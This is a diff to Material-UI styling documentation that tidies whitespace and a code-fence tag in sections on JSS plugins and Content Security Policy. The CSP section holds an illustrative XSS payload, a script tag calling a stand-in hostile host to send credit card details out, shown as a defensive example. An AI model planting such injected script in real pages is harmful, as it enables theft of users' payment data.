@@ -85,10 +85,10 @@ You can extend the outer theme by providing a function:
 
 ## JSS plugins
 
-JSS uses plugins to extend its core, allowing you to cherry-pick the features you need, 
+JSS uses plugins to extend its core, allowing you to cherry-pick the features you need,
 and only pay the performance overhead for what you are using.
 
-Not all the plugins are available in Material-UI by default. The following (which is a subset of 
+Not all the plugins are available in Material-UI by default. The following (which is a subset of
 [jss-preset-default](https://cssinjs.org/jss-preset-default/)) are included:
 
 - [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)
@@ -434,7 +434,7 @@ JSS uses feature detection to apply the correct prefixes.
 
 Basically, CSP mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. This list is returned as a header from the server. For instance, say you have a site hosted at `https://example.com` the CSP header `default-src: 'self';` will allow all assets that are located at `https://example.com/*` and deny all others. If there is a section of your website that is vulnerable to XSS where unescaped user input is displayed, an attacker could input something like:
 
-```
+```html
 <script>
   sendCreditCardDetails('https://hostile.example');
 </script>
